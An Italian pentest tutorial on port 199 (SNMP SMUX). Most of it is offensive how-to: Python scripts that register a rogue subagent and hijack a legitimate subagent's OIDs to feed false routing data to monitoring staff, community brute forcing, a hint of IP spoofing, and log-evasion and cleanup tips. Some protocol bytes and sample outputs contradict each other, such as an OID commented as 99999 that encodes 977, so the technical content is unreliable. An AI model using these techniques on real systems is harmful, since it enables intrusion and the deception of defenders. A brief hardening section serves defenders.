---
title: 'Porta 199 SMUX: cos’è, come funziona e rischi di sicurezza per SNMP'
slug: porta-199-smux
description: >-
  Scopri a cosa serve la porta 199 SMUX, come collega subagent e master agent
  SNMP, quali rischi introduce quando è esposta in rete e come analizzare
  registrazioni, OID e misconfigurazioni nei sistemi legacy.
image: /porta-199-smux.webp
draft: false
date: 2026-04-04T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - smux
  - snmp-subagent
---

Porta 199 SMUX espone il protocollo SNMP Multiplex, un meccanismo che permette a processi esterni (subagent) di registrarsi presso l'agente SNMP master e gestire sottoinsiemi dell'albero MIB. Quando trovi la porta 199 aperta, stai guardando un canale di comunicazione inter-processo che raramente è protetto. L'enumerazione porta 199 rivela quali subagent sono attivi, quali OID gestiscono e — punto critico — se accetta registrazioni da sorgenti non autorizzate. Nella kill chain SMUX abilita un percorso diretto dalla rete all'esecuzione di comandi sul target: registri un subagent falso, rispondi a query SNMP con dati manipolati, o sfrutti la fiducia implicita tra master agent e subagent per leggere dati privilegiati.

Questo articolo copre l'intero percorso: dall'identificazione di SMUX attivo alla registrazione di subagent malevoli, con scenari reali su sistemi AIX, Solaris e Linux legacy.

## 1. Anatomia Tecnica della Porta 199

La porta 199 è registrata IANA come `smux` su protocollo TCP. SMUX è definito in RFC 1227 e opera come bridge tra l'agente SNMP principale (tipicamente `snmpd`) e processi applicativi che vogliono esporre i propri dati via SNMP.

Il flusso operativo è il seguente:

1. **TCP handshake** sulla porta 199 tra subagent e master agent
2. **OpenPDU**: il subagent si identifica con un OID (identity) e opzionalmente una password
3. **RegisterPDU**: il subagent registra i rami MIB che vuole gestire
4. **GetRequest/GetNextRequest**: il master agent inoltra le query SNMP per quegli OID al subagent
5. **GetResponse**: il subagent risponde con i dati richiesti

Le implementazioni principali sono Net-SNMP smux peer (Linux), AIX SMUX (nativo su AIX 5.x-7.x), Solaris SMUX (SunOS) e applicazioni custom che usano SMUX per esporre metriche (database, middleware).

```
Misconfig: SMUX senza password di autenticazione
Impatto: qualsiasi processo sulla rete può registrarsi come subagent e gestire porzioni dell'albero MIB
Come si verifica: nc -nv [target] 199 — se la connessione TCP riesce, il servizio è raggiungibile
```

```
Misconfig: SMUX in ascolto su tutte le interfacce (0.0.0.0) invece di localhost
Impatto: attacker remoti possono connettersi e registrare subagent dalla rete
Come si verifica: nmap -sV -p 199 [target] — se open da remoto, il bind è su 0.0.0.0
```

```
Misconfig: Password SMUX in chiaro nel file di configurazione snmpd.conf
Impatto: se l'attacker ha accesso locale o può leggere il file, ottiene la password per registrarsi come subagent legittimo
Come si verifica: cat /etc/snmp/snmpd.conf | grep -i smux
```

## 2. Enumerazione Base della Porta 199 SMUX

L'enumerazione della porta 199 inizia verificando se il servizio è esposto sulla rete. SMUX è un protocollo binario (non testuale come IRC), quindi l'interazione manuale è limitata ma il fingerprint è possibile.

### Comando 1: Nmap

```bash
nmap -sV -sC -p 199 10.10.10.30
```

**Output atteso:**

```
PORT    STATE SERVICE  VERSION
199/tcp open  smux     Linux SNMP multiplexer
| fingerprint-strings:
|   NULL:
|_    \x00\x00\x00
```

**Parametri:**

* `-sV`: identifica il servizio SMUX e tenta di determinare l'implementazione (Linux/AIX/Solaris)
* `-sC`: esegue script default, che su SMUX tentano di leggere la risposta iniziale del server
* `-p 199`: scan specifico sulla porta del multiplexer

### Comando 2: Netcat per verifica connettività

```bash
nc -nv 10.10.10.30 199 -w 5
```

**Output atteso:**

```
(UNKNOWN) [10.10.10.30] 199 (smux) open
```

Seguito da bytes binari non leggibili (il server invia una challenge o attende un OpenPDU).

**Cosa ci dice questo output:** la connessione TCP riesce, il che significa che SMUX è in ascolto su un'interfaccia raggiungibile dalla rete. In una configurazione corretta, SMUX dovrebbe ascoltare solo su 127.0.0.1. Il fatto che sia raggiungibile da remoto è già una misconfigurazione significativa.

## 3. Enumerazione Avanzata

### Fingerprint del master agent tramite SNMP correlato

SMUX non opera in isolamento: è sempre accoppiato con un agente SNMP sulla porta 161. Enumerando la 161 ottieni informazioni cruciali sul contesto di SMUX. Per una guida completa sull'enumerazione SNMP, consulta la [guida alla porta 161](https://hackita.it/articoli/snmp).

```bash
snmpwalk -v 2c -c public 10.10.10.30 system
```

**Output:**

```
SNMPv2-MIB::sysDescr.0 = STRING: IBM AIX 7.2.5.3 powerpc
SNMPv2-MIB::sysObjectID.0 = OID: SNMPv2-SMI::enterprises.2.3.1.2.1.1.3
SNMPv2-MIB::sysName.0 = STRING: aix-prod-01.corp.local
SNMPv2-MIB::sysServices.0 = INTEGER: 72
```

**Lettura dell'output:** sistema AIX 7.2 — una delle piattaforme dove SMUX è più comune e spesso attivo di default. L'OID enterprise `.2.3` identifica IBM. Il nome `aix-prod-01` suggerisce un sistema di produzione. SMUX su AIX è tipicamente usato da `gated`, `dpid2` e applicazioni middleware IBM.

### Identificazione subagent registrati

Puoi scoprire quali subagent sono registrati tramite l'albero MIB SMUX:

```bash
snmpwalk -v 2c -c public 10.10.10.30 .1.3.6.1.6.3.13
```

**Output:**

```
SNMPv2-SMI::mib-2.76.1.1.1.0 = INTEGER: 2
SNMPv2-SMI::mib-2.76.1.1.2.1.2.1 = OID: SNMPv2-SMI::enterprises.2.3.1.2.3.1
SNMPv2-SMI::mib-2.76.1.1.2.1.3.1 = STRING: "gated"
SNMPv2-SMI::mib-2.76.1.1.2.1.4.1 = INTEGER: 1
```

**Lettura dell'output:** c'è un subagent registrato (`gated`, il routing daemon) che gestisce OID sotto l'enterprise IBM. Il valore INTEGER 1 indica stato attivo. Questi dati confermano che SMUX è operativo e accetta registrazioni.

### Probing diretto della porta SMUX con script Python

Per interagire con il protocollo SMUX a livello binario, puoi usare uno script che invia un OpenPDU:

```bash
python3 -c "
import socket, struct
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect(('10.10.10.30', 199))
# SMUX OpenPDU: version=0, identity=1.3.6.1.4.1.99999 (fake), password=''
open_pdu = bytes([
    0x41,  # OpenPDU tag
    0x0e,  # length
    0x02, 0x01, 0x00,  # version: 0
    0x06, 0x07, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x87, 0x51,  # identity OID
    0x04, 0x00   # empty password
])
s.send(open_pdu)
resp = s.recv(1024)
print(f'[+] Response: {resp.hex()}')
if resp[0] == 0x41:
    print('[+] SMUX accepted OpenPDU - no auth required!')
elif resp[0] == 0xa2:
    print('[-] SMUX returned error - auth required or identity rejected')
s.close()
"
```

**Output:**

```
[+] Response: 410e020100060...
[+] SMUX accepted OpenPDU - no auth required!
```

**Lettura dell'output:** il master agent ha accettato la registrazione senza password. Questo è il segnale che puoi registrare un subagent arbitrario e iniziare a manipolare l'albero MIB. Approfondisci le tecniche di [exploitation SNMP](https://hackita.it/articoli/snmp) per combinare SMUX con write access.

### Verifica configurazione SMUX nel file snmpd.conf

Se hai accesso locale (anche parziale, es: LFI, backup esposto):

```bash
grep -i smux /etc/snmp/snmpd.conf
```

**Output:**

```
smuxpeer .1.3.6.1.4.1.2.3.1.2.3.1 gated_password
smuxpeer .1.3.6.1.4.1.2.3.1.2.3.2
smuxsocket 0.0.0.0
```

**Lettura dell'output:** due subagent configurati. Il primo ha una password (`gated_password`), il secondo no. La direttiva `smuxsocket 0.0.0.0` conferma il bind su tutte le interfacce. Hai sia la password del primo subagent che la conferma che il secondo accetta connessioni senza password.

## 4. Tecniche Offensive sulla Porta 199

**Registrazione di subagent malevolo (no auth)**

Contesto: SMUX in ascolto su 0.0.0.0 senza password richiesta. Sistemi AIX/Linux legacy con configurazione di default.

```bash
python3 -c "
import socket, struct, time
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.10.30', 199))
# OpenPDU
open_pdu = bytes([0x41, 0x0e, 0x02, 0x01, 0x00, 0x06, 0x07, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x87, 0x51, 0x04, 0x00])
s.send(open_pdu)
resp = s.recv(1024)
print(f'[+] Open response: {resp.hex()}')
# RegisterPDU - registra un ramo MIB custom
reg_pdu = bytes([
    0xa3,  # RReqPDU tag
    0x0c,
    0x06, 0x08, 0x2b, 0x06, 0x01, 0x02, 0x01, 0x19, 0x01, 0x01,  # OID to register
    0x02, 0x01, 0x00  # priority: 0 (highest)
])
s.send(reg_pdu)
resp = s.recv(1024)
print(f'[+] Register response: {resp.hex()}')
print('[+] Subagent registered - waiting for queries...')
while True:
    data = s.recv(4096)
    if data:
        print(f'[*] Query received: {data.hex()}')
    time.sleep(1)
"
```

**Output (successo):**

```
[+] Open response: 410e020100...
[+] Register response: a30c0602...
[+] Subagent registered - waiting for queries...
[*] Query received: a00e0201...
```

**Output (fallimento):**

```
[+] Open response: a20a020103...
[-] Registration rejected - identity not allowed
```

**Cosa fai dopo:** il tuo subagent è registrato con priorità massima. Quando qualcuno (o il NMS) esegue query SNMP per gli OID che hai registrato, la query arriva a te. Puoi rispondere con dati falsificati o usare questo canale per esfiltrare informazioni. Consulta la guida sul [post-exploitation](https://hackita.it/articoli/postexploitation) per le fasi successive.

**OID hijacking — sostituzione di subagent legittimo**

Contesto: un subagent legittimo (es: `gated`) gestisce OID specifici. Registri lo stesso ramo con priorità più alta per intercettare le query.

```bash
python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.10.30', 199))
# OpenPDU con identity del subagent legittimo
open_pdu = bytes([0x41, 0x12, 0x02, 0x01, 0x00, 0x06, 0x09, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x02, 0x03, 0x01, 0x02, 0x04, 0x00])
s.send(open_pdu)
resp = s.recv(1024)
# RegisterPDU con priorità 0 (override)
reg_pdu = bytes([0xa3, 0x0e, 0x06, 0x09, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x02, 0x03, 0x01, 0x02, 0x02, 0x01, 0x00])
s.send(reg_pdu)
resp = s.recv(1024)
print('[+] OID hijacked - now intercepting queries for gated MIB')
"
```

**Output (successo):**

```
[+] OID hijacked - now intercepting queries for gated MIB
```

**Output (fallimento):**

```
Connection refused
```

**Cosa fai dopo:** hai preso il controllo degli OID di routing. Le query SNMP che il NMS fa per monitorare le rotte ora arrivano a te. Puoi rispondere con tabelle di routing false per mascherare modifiche alla rete o per confondere il NOC durante un'operazione red team.

**Lettura di dati privilegiati via subagent chain**

Contesto: dopo la registrazione come subagent, puoi enumerare altri subagent registrati e i loro OID per scoprire quali dati sono esposti via SMUX.

```bash
snmpwalk -v 2c -c public 10.10.10.30 .1.3.6.1.4.1
```

**Output (successo):**

```
SNMPv2-SMI::enterprises.2.6.191.1.1.1.0 = STRING: "/dev/hdisk0"
SNMPv2-SMI::enterprises.2.6.191.1.1.2.0 = STRING: "/usr"
SNMPv2-SMI::enterprises.2.6.191.1.1.3.0 = INTEGER: 95
SNMPv2-SMI::enterprises.2.6.191.9.1.1.0 = STRING: "db2inst1"
SNMPv2-SMI::enterprises.2.6.191.9.1.2.0 = INTEGER: 5000
```

**Output (fallimento):**

```
Timeout: No Response from 10.10.10.30
```

**Cosa fai dopo:** l'albero enterprise IBM rivela filesystem (`/dev/hdisk0`, `/usr` al 95% — quasi pieno), istanze DB2 (`db2inst1`) e configurazione middleware. L'utente `db2inst1` e la porta 5000 sono target per accesso diretto al database. Usa queste info per costruire il tuo percorso di [lateral movement](https://hackita.it/articoli/pivoting).

## 5. Scenari Pratici di Pentest

### Scenario 1: Enterprise AIX con SMUX di default

**Situazione:** datacenter con 15 server AIX 7.x. SMUX attivo di default su tutti. Rete di management flat, hai compromesso una workstation admin.

**Step 1:**

```bash
nmap -sV -p 199 10.10.10.0/24 --open -Pn
```

**Output atteso:**

```
10.10.10.30 - 199/tcp open smux
10.10.10.31 - 199/tcp open smux
10.10.10.35 - 199/tcp open smux
```

**Step 2:**

```bash
for host in 10.10.10.30 10.10.10.31 10.10.10.35; do
  echo "=== $host ===" 
  snmpwalk -v 2c -c public "$host" system 2>/dev/null | head -3
done
```

**Output atteso:**

```
=== 10.10.10.30 ===
SNMPv2-MIB::sysDescr.0 = STRING: IBM AIX 7.2.5.3 powerpc
SNMPv2-MIB::sysName.0 = STRING: aix-db-01
=== 10.10.10.31 ===
SNMPv2-MIB::sysDescr.0 = STRING: IBM AIX 7.2.5.3 powerpc
SNMPv2-MIB::sysName.0 = STRING: aix-app-01
```

**Se fallisce:**

* Causa probabile: community string non è `public` su questi sistemi
* Fix: usa `onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.10.30` per brute della community

**Tempo stimato:** 10-20 minuti per discovery e enum iniziale

### Scenario 2: Linux legacy con Net-SNMP SMUX

**Situazione:** server Linux CentOS 6/7 con Net-SNMP configurato per SMUX. Usato da applicazione di monitoring custom. Hai accesso SSH limitato (utente non privilegiato).

**Step 1:**

```bash
ss -tlnp | grep 199
```

**Output atteso:**

```
LISTEN  0  5  0.0.0.0:199  0.0.0.0:*  users:(("snmpd",pid=1234,fd=8))
```

**Step 2:**

```bash
cat /etc/snmp/snmpd.conf 2>/dev/null | grep -i smux
```

**Output atteso:**

```
smuxpeer .1.3.6.1.4.1.674.10892 dell_agent
smuxpeer .1.3.6.1.4.1.2021.1000
smuxsocket 0.0.0.0
```

**Se fallisce:**

* Causa probabile: file snmpd.conf non leggibile dall'utente corrente
* Fix: cerca copie di backup: `find / -name "snmpd.conf*" -readable 2>/dev/null`

**Tempo stimato:** 5-10 minuti

### Scenario 3: Segmented network con SMUX come pivot point

**Situazione:** rete segmentata con firewall tra zona server e zona management. SMUX sulla porta 199 è uno dei pochi servizi che passa il firewall perché il NMS lo usa per monitoring. Hai compromesso un server nella zona server.

**Step 1:**

```bash
nmap -sV -p 199 10.20.0.0/24 -Pn --open
```

**Output atteso:**

```
10.20.0.10 - 199/tcp open smux
```

**Step 2:**

```bash
python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.settimeout(5)
    s.connect(('10.20.0.10', 199))
    print('[+] SMUX reachable across firewall on 10.20.0.10:199')
    s.close()
except:
    print('[-] Connection failed')
"
```

**Output atteso:**

```
[+] SMUX reachable across firewall on 10.20.0.10:199
```

**Se fallisce:**

* Causa probabile: il firewall permette solo connessioni dal NMS specifico, non da tutta la zona server
* Fix: verifica l'IP del NMS (spesso nel file snmpd.conf locale) e usa IP spoofing se sei sulla stessa subnet

**Tempo stimato:** 15-30 minuti inclusa la verifica del firewall

## 6. Attack Chain Completa

```
Recon (scan porta 199) → SNMP enum (porta 161) → SMUX probe (porta 199) → Subagent Registration → OID Hijack/Data Manipulation → Credential Extraction → Lateral Movement
```

| Fase         | Tool      | Comando chiave                                  | Output/Risultato                 |
| ------------ | --------- | ----------------------------------------------- | -------------------------------- |
| Recon        | nmap      | `nmap -sV -p 199,161 -Pn [subnet]`              | Host con SMUX e SNMP attivi      |
| SNMP Enum    | snmpwalk  | `snmpwalk -v 2c -c [comm] [target] system`      | OS, hostname, versione           |
| SMUX Probe   | python/nc | `nc -nv [target] 199`                           | Conferma accessibilità SMUX      |
| Config Read  | grep      | `grep smux /etc/snmp/snmpd.conf`                | Password, OID subagent           |
| Subagent Reg | python    | Script OpenPDU + RegisterPDU                    | Registrazione come subagent      |
| Data Extract | snmpwalk  | `snmpwalk -v 2c -c [comm] [target] enterprises` | Dati applicativi, utenti, config |

**Timeline stimata:** 20-60 minuti dalla discovery alla registrazione del subagent. L'estrazione dati è immediata dopo la registrazione.

**Ruolo della porta 199:** SMUX è il tramite tra la rete e il cuore dell'agente SNMP. Chi controlla SMUX controlla cosa vede il NMS e quali dati il sistema espone via SNMP. In ambienti dove SNMP è il principale vettore di monitoring, manipolare SMUX equivale a diventare invisibile o a fornire intelligence falsa al SOC.

## 7. Detection & Evasion

### Cosa monitora il Blue Team

* **Log di snmpd**: connessioni SMUX in ingresso. Path Linux: `/var/log/snmpd.log` o `journalctl -u snmpd`. Path AIX: `/var/log/syslog` con facility daemon
* **Connessioni TCP sulla 199**: il NMS dovrebbe avere una baseline di connessioni SMUX. Nuove connessioni sono anomale
* **Registrazioni di OID inattesi**: se il master agent logga le registrazioni dei subagent, OID non previsti generano alert
* **IDS**: regole per traffico TCP/199 da sorgenti non autorizzate

### Tecniche di Evasion

```
Tecnica: Connessione da localhost
Come: se hai accesso locale al sistema, connettiti a 127.0.0.1:199 invece che all'IP di rete. Nessun traffico di rete generato
Riduzione rumore: invisibile a IDS/firewall, visibile solo nei log locali di snmpd
```

```
Tecnica: Timing delle registrazioni
Come: registra il subagent durante un restart pianificato di snmpd (le registrazioni sono normali dopo un restart)
Riduzione rumore: la registrazione si confonde con il processo di startup normale
```

```
Tecnica: Utilizzo dell'identity OID di un subagent legittimo
Come: usa l'identity OID di gated o di un'altra applicazione nota per il sistema
Riduzione rumore: nei log, la registrazione appare provenire da un subagent atteso
```

### Cleanup Post-Exploitation

* Chiudi la connessione TCP al master agent (il subagent viene de-registrato automaticamente)
* Se hai modificato snmpd.conf: ripristina il file originale
* Verifica con `snmpwalk` che gli OID che avevi registrato tornino a rispondere normalmente
* Controlla `/var/log/snmpd.log` per tracce della tua connessione (se hai accesso)

## 8. Toolchain e Confronto

### Pipeline operativa

```
nmap (scan 199+161) → snmpwalk (enum base) → python (SMUX probe/register) → snmpwalk (data extraction post-register) → ssh/telnet (lateral movement con credenziali estratte)
```

Dati che passano tra fasi: IP host SMUX, community string, OID dei subagent, password SMUX (da config), dati enterprise (filesystem, utenti, processi, config applicative).

### Tabella comparativa

| Aspetto           | SMUX (199/TCP)                      | AgentX (705/TCP)                | SNMP diretto (161/UDP)           |
| ----------------- | ----------------------------------- | ------------------------------- | -------------------------------- |
| Porta default     | 199                                 | 705                             | 161                              |
| Protocollo        | TCP                                 | TCP                             | UDP                              |
| Funzione          | Subagent registration (legacy)      | Subagent registration (moderno) | Query/Set diretti                |
| Autenticazione    | Password opzionale                  | Nessuna nativa (ACL)            | Community string                 |
| Diffusione 2026   | AIX, Solaris legacy, Linux vecchi   | Net-SNMP moderni, Linux         | Universale                       |
| Rischio abuse     | Alto (registrazione subagent)       | Alto (simile a SMUX)            | Medio-alto (dipende da RW)       |
| Quando preferirlo | Target AIX/Solaris con SMUX esposto | Target Linux moderno con AgentX | Qualsiasi target con SNMP attivo |

## 9. Troubleshooting

| Errore / Sintomo                             | Causa                                                                   | Fix                                                                                   |
| -------------------------------------------- | ----------------------------------------------------------------------- | ------------------------------------------------------------------------------------- |
| `Connection refused` su porta 199            | SMUX non attivo o in ascolto solo su 127.0.0.1                          | Verifica con `ss -tlnp \| grep 199` da locale. Se loopback only, serve accesso locale |
| OpenPDU rifiutato (response tag `0xa2`)      | Identity OID non autorizzato o password richiesta                       | Cerca la password in `/etc/snmp/snmpd.conf` con `grep smuxpeer`                       |
| RegisterPDU rifiutato                        | OID già registrato da un altro subagent con priorità uguale o superiore | Usa priorità 0 (massima): `0x02, 0x01, 0x00` nel RegisterPDU                          |
| Connessione TCP riuscita ma nessuna risposta | Master agent in stato anomalo o versione SMUX incompatibile             | Verifica la versione di snmpd: `snmpd -v` e controlla compatibilità                   |
| `snmpwalk` non mostra OID enterprise         | Community string con accesso limitato all'albero standard               | Prova community alternative o walk specifico su `.1.3.6.1.4.1`                        |

## 10. FAQ

**D: Cos'è SMUX e a cosa serve la porta 199?**

R: SMUX (SNMP Multiplex) è un protocollo che permette a processi esterni di registrarsi come subagent presso l'agente SNMP master sulla porta 199 TCP. Serve a estendere l'albero MIB SNMP con dati di applicazioni terze senza modificare l'agente principale.

**D: Porta 199 SMUX è pericolosa se esposta sulla rete?**

R: Sì. Se SMUX accetta connessioni dalla rete (bind su 0.0.0.0) e non richiede password, un attacker può registrare subagent malevoli, intercettare query SNMP destinate ad altri subagent e manipolare i dati esposti via SNMP.

**D: Qual è la differenza tra SMUX porta 199 e AgentX porta 705?**

R: SMUX (RFC 1227) è il protocollo legacy per la registrazione di subagent SNMP. AgentX (RFC 2741) è il successore moderno. SMUX usa TCP/199, AgentX usa TCP/705. AgentX è più diffuso su sistemi Linux recenti, SMUX si trova principalmente su AIX, Solaris e installazioni legacy.

**D: Come verificare se SMUX richiede autenticazione?**

R: Tenta una connessione TCP con `nc -nv [target] 199`. Se il server accetta, invia un OpenPDU con password vuota usando lo script Python descritto in questo articolo. Se la risposta è un OpenPDU di ritorno, l'autenticazione non è attiva.

**D: Su quali sistemi operativi trovo SMUX attivo di default?**

R: SMUX è attivo di default su IBM AIX 5.x-7.x quando SNMP è configurato. Su Solaris 10/11 è presente ma spesso disabilitato. Su Linux con Net-SNMP è opzionale e richiede configurazione esplicita in `snmpd.conf`. Verifica sempre con `nmap -p 199 [target]`.

**D: Posso usare SMUX per eseguire comandi remoti?**

R: Non direttamente. SMUX permette di registrare subagent e rispondere a query SNMP. Tuttavia, combinato con `NET-SNMP-EXTEND-MIB` (se abilitato), puoi far eseguire comandi al sistema tramite SNMP SET che invocano script registrati. Verifica con `snmpwalk -v 2c -c [comm] [target] nsExtendObjects`.

## 11. Cheat Sheet Finale

| Azione                | Comando                                              | Note                                     |
| --------------------- | ---------------------------------------------------- | ---------------------------------------- |
| Scan porta SMUX       | `nmap -sV -p 199 -Pn [target]`                       | Combina con `-p 161` per SNMP correlato  |
| Verifica connettività | `nc -nv [target] 199 -w 5`                           | Se open = SMUX raggiungibile             |
| SNMP enum correlata   | `snmpwalk -v 2c -c public [target] system`           | OS, hostname, contesto                   |
| Cerca config SMUX     | `grep -i smux /etc/snmp/snmpd.conf`                  | Password e OID subagent                  |
| Brute community       | `onesixtyone -c snmp.txt [target]`                   | Se community non è public                |
| Probe SMUX no-auth    | Script Python OpenPDU (vedi sezione 3)               | Verifica se accetta senza password       |
| Registra subagent     | Script Python OpenPDU + RegisterPDU (vedi sezione 4) | Priorità 0 per override                  |
| Enum enterprise MIB   | `snmpwalk -v 2c -c [comm] [target] .1.3.6.1.4.1`     | Dati applicativi                         |
| Cerca RCE via extend  | `snmpwalk -v 2c -c [comm] [target] nsExtendObjects`  | Comandi registrati                       |
| Verifica bind address | `ss -tlnp \| grep 199`                               | Da locale, verifica 0.0.0.0 vs 127.0.0.1 |

### Perché Porta 199 è rilevante nel 2026

SMUX sopravvive in ambienti enterprise con legacy IBM AIX e Solaris, che restano diffusi in banche, assicurazioni e industria manifatturiera. La migrazione a AgentX (porta 705) è in corso ma lenta. Ogni sistema AIX con SNMP attivo ha potenzialmente SMUX sulla 199. Verifica la presenza nella tua rete target con `nmap -p 199 [subnet] --open` — spesso è una porta dimenticata che nessuno monitora.

### Hardening e Mitigazione

* Configura SMUX per ascoltare solo su localhost: `smuxsocket 127.0.0.1` in `snmpd.conf`
* Imposta password per ogni subagent: `smuxpeer [OID] [password_complessa]`
* Se SMUX non è necessario, disabilitalo completamente rimuovendo le direttive `smuxpeer` e riavviando snmpd
* Su AIX: verifica con `lssrc -s snmpd` lo stato e la configurazione attiva

### OPSEC per il Red Team

La connessione TCP sulla porta 199 genera un log nel daemon snmpd (se il log level è sufficientemente alto). Su AIX, il log va in syslog con facility `daemon`. Il livello di rumore è basso: SMUX è un protocollo di nicchia e raramente monitorato da SIEM o IDS. Tuttavia, se il NMS ha una baseline di connessioni SMUX, una nuova connessione potrebbe essere notata. Per ridurre visibilità: connettiti da un IP che il NMS già usa come sorgente SNMP, esegui la registrazione in orari di basso monitoring, e disconnettiti appena hai i dati necessari (non mantenere sessioni SMUX aperte a lungo).

***

Tutti i comandi e le tecniche descritti in questo articolo sono destinati esclusivamente ad ambienti autorizzati: penetration test con contratto firmato, laboratori personali, piattaforme CTF. Riferimento tecnico: RFC 1227 (SNMP MUX Protocol), RFC 2741 (AgentX Protocol).

> Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
